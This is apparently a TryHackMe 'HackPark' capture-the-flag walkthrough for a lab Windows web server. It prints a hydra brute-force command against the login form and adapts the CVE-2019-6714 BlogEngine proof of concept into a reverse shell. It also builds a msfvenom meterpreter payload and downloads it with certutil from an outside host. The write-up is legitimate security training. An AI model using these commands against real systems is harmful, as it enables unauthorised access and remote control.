https://tryhackme.com/r/room/hackpark

---

**Q1. Whats the name of the clown displayed on the homepage?**
I put the image on google and it gave me `pennywise`

**Q2. What request type is the Windows website login form using?**
It is a common `POST` form

**Q3. Guess a username, choose a password wordlist and gain credentials to a user account!**
The hint gave me the user `admin`. I captured the `POST` request for login in burp to get the parameters and I setup my hydra command.
`__VIEWSTATE` and `__EVENTVALIDATION` are 2 tokens quite useless because I can reutilise them to bruteforce with hydra
```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-post-form://10.10.44.195:80/Account/login.aspx:__VIEWST  
ATE=J6qO5ft%2BM8gYsvoowzR2XmBvILbt33COZL04l2BJyqYWAqfCK4mZwybD3tRdExXIs1LhRGRacAFWMbxTByq%2BLT%2BxSvEO9UROi4pXtUY8vH  
zSKWDvFBJJ44PGRL4YIS4mA62HJ%2FyxVAOhnZrPWRve42TSXXPlsBn0g3DfII9GpL5YudcKF0oDelCvlfE0qtAGB6TC6R441LgvzZP%2B6RwFdRji0E  
kBdR1p6kRLs9FIBeyDI3oqiNodQAB%2BXs%2Fspz%2Bh4lzdLmREDEIe7g8d5E5IKj8Mw%2FvF0tDVF80Rdz01IgYjfpsoRububw7jPzEZ%2FxgwB0cU  
jcJ79SItcx7mO9R33g%2FIuOHJslnkgaQoNg33mTz5yA9j&__EVENTVALIDATION=AEUMjnVtHp%2BMU70GKhLKkQxw6%2BDeAGw8v4n6CbSArrKogQE  
FfEiCWYIwx5dMCcQmEsWfno24TmH%2B6EV%2FluXlqKn1VujHIq09PaWNc2AGOdO6%2FmvnM%2BxyNKMowOfOMyZo8%2FNpjigt2qpjV%2F2k%2FcUcU  
R6Li6H6qeJ8n9iUC2OIGIPo5RRd&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Pass  
word=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed'
```

So the creds are `admin:1qaz2wsx`

**Q4. Now you have logged into the website, are you able to identify the version of the BlogEngine?**
The version is in the About section

**Q5. What is the CVE?**
I found the [CVE-2019-6714](https://www.exploit-db.com/exploits/46353) on exploitdb

**Q6. Who is the webserver running as?**
So I have to exploit this CVE to get the webserver username

I downloaded the `46353.cs` POC from the link above and renamed in `PostView.ascx` as suggested. Then I changed the `TcpClient` line with my own ip to set up the reverse shell
```cs
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.14.79.56", 9001))
```

Then I went on `http://10.10.44.195/admin/app/editor/editpost.cshtml` to upload the `PostView.ascx` through the file manager and triggered it by going on `http://10.10.44.195/?theme=../../App_Data/files`

And here I m in, `whoami` showed me the `iis apppool\blog` username

##### Stabilizing the shell
Now I need to setup a better shell with meterpreter

To do that, I need to create the `exe` file to trigger my listener
```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.79.56 LPORT=9002 -f exe -o shell.exe
```
Then I create a python server

With my windows retarded shell, I'm downloading the new `shell.exe` from my python server
```powershell
certutil -urlcache -split -f "http://10.14.79.56:5050/shell.exe" C:\Users\Public\shell.exe
```

Now I need to setup the meterpreter listener
```shell
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.14.79.56
set LPORT 9002
exploit
```

Once it's done, I just have to trigger it on windows by executing the `shell.exe`
```powershell
C:\Users\Public\shell.exe
```

**Q7. What is the OS version of this windows machine?**
On the meterpreter, I just have to type `sysinfo`

**Q8. What is the name of the abnormal _service_ running?**
It's not an abnormal service, it's just the scheduler

**Q9. What is the name of the binary you're supposed to exploit?**
`ps` then bruteforce but the last process in time `Message.exe` was obvious when we think about it

**Q10. What is the user flag (on Jeffs Desktop)?**
On Jeff's desktop

**Q11.  What is the root flag?**
On Administrator's desktop

**Q12. Using winPeas, what was the Original Install time? (This is date and time)**
No date in winPEAS, so:
```powershell
systeminfo | find /i "Original Install Date"
```

